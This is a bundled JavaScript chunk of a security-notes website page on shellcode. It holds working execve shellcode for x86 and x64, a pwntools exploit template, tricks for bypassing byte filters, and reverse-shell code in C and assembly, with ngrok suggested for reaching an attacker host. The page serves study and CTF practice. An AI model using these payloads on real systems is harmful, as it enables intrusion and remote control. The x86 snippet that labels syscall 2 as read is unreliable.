"use strict";(self.webpackChunk_2_h_3_ph_3rd_github_io=self.webpackChunk_2_h_3_ph_3rd_github_io||[]).push([[8136],{3905:(e,t,n)=>{n.d(t,{Zo:()=>d,kt:()=>h});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},l=Object.keys(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(a=0;a<l.length;a++)n=l[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var i=a.createContext({}),c=function(e){var t=a.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},d=function(e){var t=c(e.components);return a.createElement(i.Provider,{value:t},e.children)},p="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,l=e.originalType,i=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),p=c(n),m=r,h=p["".concat(i,".").concat(m)]||p[m]||u[m]||l;return n?a.createElement(h,o(o({ref:t},d),{},{components:n})):a.createElement(h,o({ref:t},d))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var l=n.length,o=new Array(l);o[0]=m;var s={};for(var i in t)hasOwnProperty.call(t,i)&&(s[i]=t[i]);s.originalType=e,s[p]="string"==typeof e?e:r,o[1]=s;for(var c=2;c<l;c++)o[c]=n[c];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},5128:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>o,default:()=>u,frontMatter:()=>l,metadata:()=>s,toc:()=>c});var a=n(7462),r=(n(7294),n(3905));const l={id:"shellcode",title:"Shellcode"},o="Shellcode",s={unversionedId:"security/binary/shellcode",id:"security/binary/shellcode",title:"Shellcode",description:"A shellcode is a malicious sequence of assembly instruction.",source:"@site/docs/security/04-binary/05-shellcode.md",sourceDirName:"security/04-binary",slug:"/security/binary/shellcode",permalink:"/docs/security/binary/shellcode",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/04-binary/05-shellcode.md",tags:[],version:"current",sidebarPosition:5,frontMatter:{id:"shellcode",title:"Shellcode"},sidebar:"securitySidebar",previous:{title:"Reverse",permalink:"/docs/security/binary/reverse"},next:{title:"Mitigations",permalink:"/docs/security/binary/mitigations"}},i={},c=[{value:"execve",id:"execve",level:3},{value:"x86",id:"x86",level:3},{value:"x64",id:"x64",level:3},{value:"Python template",id:"python-template",level:2},{value:"Alternative ways to write a shellcode",id:"alternative-ways-to-write-a-shellcode",level:2},{value:"Write the path parameter on stack",id:"write-the-path-parameter-on-stack",level:3},{value:"Use a call to get the address of the path parameter",id:"use-a-call-to-get-the-address-of-the-path-parameter",level:3},{value:"Special cases",id:"special-cases",level:2},{value:"Specific characters are not allowed",id:"specific-characters-are-not-allowed",level:3},{value:"Not enough input",id:"not-enough-input",level:3},{value:"Copy RIP content inside another registry",id:"copy-rip-content-inside-another-registry",level:3},{value:"Few bytes operations",id:"few-bytes-operations",level:3},{value:"Reverse shell over TCP socket",id:"reverse-shell-over-tcp-socket",level:2},{value:"socket",id:"socket",level:3},{value:"connect",id:"connect",level:3},{value:"dup2",id:"dup2",level:3}],d={toc:c},p="wrapper";function u(e){let{components:t,...l}=e;return(0,r.kt)(p,(0,a.Z)({},d,l,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"shellcode"},"Shellcode"),(0,r.kt)("p",null,"A shellcode is a malicious sequence of assembly instruction.\nUsually, it is inserted in memory and then executed by exploiting a vulnerability.\nIt is called shellcode because at the beginning it was used only to obtain a shell.\nNowadays, shellcodes are used to execute whatever sequence of instructions."),(0,r.kt)("p",null,"You must have a vulnerability that allows to overwrite the saved instruction pointer of a function.\nAlso, the memory area where you write the shellcode must be executable."),(0,r.kt)("h3",{id:"execve"},"execve"),(0,r.kt)("p",null,"A shellcode is usually used to obtain a reverse shell by running the ",(0,r.kt)("inlineCode",{parentName:"p"},"execve")," syscall with the right parameters."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"int execve(const char *pathname, char *const argv[], char *const envp[]);")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"pathname")," The path for the executable to be run, usually a pointer to the string ",(0,r.kt)("inlineCode",{parentName:"p"},"/bin/sh\\0")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"argv")," A pointer to an array of command line parameters, it can be null"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"envp")," A pointer to an array of environmental variables, it can be null"),(0,r.kt)("p",{align:"center"},(0,r.kt)("img",{src:n(1379).Z})),(0,r.kt)("h3",{id:"x86"},"x86"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Register"),(0,r.kt)("th",{parentName:"tr",align:null},"Content"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"eax"),(0,r.kt)("td",{parentName:"tr",align:null},"syscall code")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"ebx"),(0,r.kt)("td",{parentName:"tr",align:null},"path")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"ecx"),(0,r.kt)("td",{parentName:"tr",align:null},"argv")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"edx"),(0,r.kt)("td",{parentName:"tr",align:null},"envp")))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},'mov eax, 0xb                            ; execve code in x86\nmov ebx, <address of "/bin/sh\\0">\nmov ecx, 0\nmov edx, 0\nint 0x80\n')),(0,r.kt)("h3",{id:"x64"},"x64"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Register"),(0,r.kt)("th",{parentName:"tr",align:null},"Content"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"rax"),(0,r.kt)("td",{parentName:"tr",align:null},"syscall code")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"rdi"),(0,r.kt)("td",{parentName:"tr",align:null},"path")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"rsi"),(0,r.kt)("td",{parentName:"tr",align:null},"argv")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"rdx"),(0,r.kt)("td",{parentName:"tr",align:null},"envp")))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},'mov rax, 0x3b                           ; execve code in x64\nmov rdi, <address of "/bin/sh\\0">\nmov rsi, 0\nmov rdx, 0\nsyscall\n')),(0,r.kt)("h2",{id:"python-template"},"Python template"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-py"},'#!/usr/bin/env python3\n\nimport sys\nfrom pwn import *\n\nif "--remote" in sys.argv:\n    p = remote("url", 1337)\nelse:\n    p = process("./path_to_binary")\n\nif "--debug" in sys.argv:\n    context.terminal = ["gnome-terminal"]\n    gdb.attach(p, """\n    b *<address_breakpoint>\n    c\n    """)\n\nshellcode = asm("""\nmov rax, 0x3b\nmov rdi, <buffer_address>\nmov rsi, 0\nmov rdx, 0\nsyscall\n""", arch=\'amd64\')\n\npayload = "A" * 64\npayload += shellcode\np.sendline(payload)\np.interactive()\n')),(0,r.kt)("h2",{id:"alternative-ways-to-write-a-shellcode"},"Alternative ways to write a shellcode"),(0,r.kt)("h3",{id:"write-the-path-parameter-on-stack"},"Write the path parameter on stack"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},'mov rdi, 0x68732f6e69622f         ; write the string "/bin/sh\\0" in a register\npush rdi                          ; push it on stack\nmov rdi, rsp                      ; get its address\n\nmov rax, 0x3b\nmov rsi, 0\nmov rdx, 0\nsyscall\n')),(0,r.kt)("h3",{id:"use-a-call-to-get-the-address-of-the-path-parameter"},"Use a call to get the address of the path parameter"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},'jmp address\n\ncode:\n    mov rax, 0x3b\n    pop rdi\n    mov rsi, 0\n    mov rdx, 0\n    syscall\n\naddress:\n    call code           ; the next address is saved on stack\n\n    ; put here "/bin/sh\\0" during the read of the shellcode\n')),(0,r.kt)("h2",{id:"special-cases"},"Special cases"),(0,r.kt)("h3",{id:"specific-characters-are-not-allowed"},"Specific characters are not allowed"),(0,r.kt)("p",null,'To put "\\0" at the end of "/bin/sh" is possible to use these instructions.'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},'mov ebx, 0x804c040      ; ebx is the address of the string "/bin/sh"\nmov al, 0               ; al is zero\nmov [ebx + 7], al       ; move zero in the byte pointed by ebx + 7\n')),(0,r.kt)("p",null,"The idea is to put the value in a registry and then move it inside a specific address.\nIt can be used to change everything in memory."),(0,r.kt)("p",null,'For example, we could find a binary that blocks any syscalls by filtering the bytes "0f 05" (syscall assembly code).\nTo overcome it you could write the initial shellcode padded with a nop sled.\nThen, you could write the two characters needed in any point of the memory.'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},"; rax contains the address of the buffer where the shellcode is written\n; 0f 05 is the assembly code for the syscall instruction\n\nmov bl, 0x0e\ninc bl\nmov [rax + 107], bl\n\nmov bl, 0x04\ninc bl\nmov [rax + 108], bl\n")),(0,r.kt)("h3",{id:"not-enough-input"},"Not enough input"),(0,r.kt)("p",null,"If there is not enough input for a shellcode you could try to call a read or other syscalls."),(0,r.kt)("p",null,"For example, this shellcode for x86 is long 22 chars once assembled, but it allows to read additional 256 chars."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},"mov eax, 2                      ; read syscall code\nmov ebx, 0\nmov ecx, <buffer_address>\nmov edx, 0x100                  ; number of characters to read\nint 0x80\n")),(0,r.kt)("h3",{id:"copy-rip-content-inside-another-registry"},"Copy RIP content inside another registry"),(0,r.kt)("p",null,"It is not possible to directly move the RIP content inside another registry.\nWe can bypass it by using the call instruction."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"call here       ; address of next istruction (sRIP) is saved on top of the stack\n\ncode:\n    ; additional code here...\n\nhere:\n    pop rsi     ; rsi will contain the RIP address, you can change it with other registers\n    jmp code\n")),(0,r.kt)("h3",{id:"few-bytes-operations"},"Few bytes operations"),(0,r.kt)("admonition",{type:"caution"},(0,r.kt)("p",{parentName:"admonition"},"Be careful, working with x32 registers in x64 leads to lose the high part of them."),(0,r.kt)("p",{parentName:"admonition"},"For example, the instruction ",(0,r.kt)("inlineCode",{parentName:"p"},"inc esp")," removes the high bytes of rsp.")),(0,r.kt)("p",null,"One byte"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"push rax\npop rax\n\ninc eax\ndec eax\n\nmov al, 0xff\nadd al, 0xff\nsub al, 0xff\n\nxor al, al\nor al, al\nand al, al\n\ninc al\ndec al\nshl al\nshr al\n")),(0,r.kt)("p",null,"Two bytes"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},"syscall\n\nmov eax, esp\n\nxor eax, eax\nor eax, eax\nand eax, eax\n\nshl eax\nshr eax\n")),(0,r.kt)("h2",{id:"reverse-shell-over-tcp-socket"},"Reverse shell over TCP socket"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Create a new socket"),(0,r.kt)("li",{parentName:"ol"},"Copy the file descriptor of the new socket"),(0,r.kt)("li",{parentName:"ol"},"Connect to your server"),(0,r.kt)("li",{parentName:"ol"},"Duplicate the file descriptors for input, output and error with the new one."),(0,r.kt)("li",{parentName:"ol"},"Exec a shell"),(0,r.kt)("li",{parentName:"ol"},"Exploit")),(0,r.kt)("p",null,"This is a sample of the C code that does the same thing.\nIt can be used for testing or as guide using gdb."),(0,r.kt)("p",null,"You can use a tool like ",(0,r.kt)("a",{parentName:"p",href:"https://ngrok.com/"},"ngrok")," to make a public tcp tunnel to your localhost."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c",metastring:'title="socket.c"',title:'"socket.c"'},'#include <arpa/inet.h>\n#include <stdio.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\nint main()\n{\n    struct sockaddr_in serv_addr;\n    int sock = 0;\n    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(1337);\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)\n    {\n        puts("Cannot connect!");\n        return 1;\n    }\n    puts("Connected");\n\n    dup2(sock, 0);\n    dup2(sock, 1);\n    dup2(sock, 2);\n\n    execve("/bin/sh\\0", NULL, NULL);\n    return 0;\n}\n')),(0,r.kt)("h3",{id:"socket"},"socket"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"int socket (int domain, int type, int protocol)")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"domain: 2 for IPv4 socket"),(0,r.kt)("li",{parentName:"ul"},"type: 1 for standard socket"),(0,r.kt)("li",{parentName:"ul"},"protocol: 0 for TCP")),(0,r.kt)("p",null,"The file descriptor of the created socket is returned in the rax register."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},"mov rax, 0x29\nmov rdi, 2\nmov rsi, 1\nmov rdx, 0\nsyscall\n\nmov rbx, rax    ; returned value is saved inside rbx, this is important for the next examples\n")),(0,r.kt)("h3",{id:"connect"},"connect"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"int connect(int socket, const struct sockaddr *address, socklen_t address_len);")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},"struct in_addr {\n    unsigned long s_addr;       /* Internet address (32 bits) */\n}\n\nstruct sockaddr_in {\n    unsigned short sin_family;  /* Internet protocol (AF_INET) */\n    unsigned short sin_port;    /* Address port (16 bits) */\n    struct in_addr sin_addr;    /* Internet address (32 bits) */\n    char sin_zero[8];           /* Not used */\n}\n")),(0,r.kt)("p",null,"The struct is composed by ",(0,r.kt)("inlineCode",{parentName:"p"},"ip + hton(port) + 2 (IF_NET type of socket)")," with a size of 8 bytes (4 + 2 + 2)."),(0,r.kt)("p",null,"For example, considering the ip 127.0.0.1, the port 1337 and type 2:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"0x0100007f39050002 ->   0100007f    3905    0002\n                        127.0.0.1   1337      2\n")),(0,r.kt)("p",null,"Remember little endian for each value.\nIP address is saved byte per byte."),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"socket:")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},"mov rsi, 0x0100007f39050002\npush rsi\nmov rsi, rsp\n\nmov rax, 0x2a\nmov rdi, rbx        ; rbx contains the socket descriptor\nmov rdx, 0x10\nsyscall\n")),(0,r.kt)("h3",{id:"dup2"},"dup2"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"dup2(int oldfd, int newfd);")),(0,r.kt)("p",null,"Substitute standard input, output and error with the socket descriptor (rbx)."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-as"},"mov rax, 0x21\nmov rdi, rbx\nmov rsi, 0\nsyscall\n\nmov rax, 0x21\nmov rdi, rbx\nmov rsi, 1\nsyscall\n\nmov rax, 0x21\nmov rdi, rbx\nmov rsi, 2\nsyscall\n")))}u.isMDXComponent=!0},1379:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/execve-019e48be19bf3ad017f4e8bacef59db0.jpg"}}]);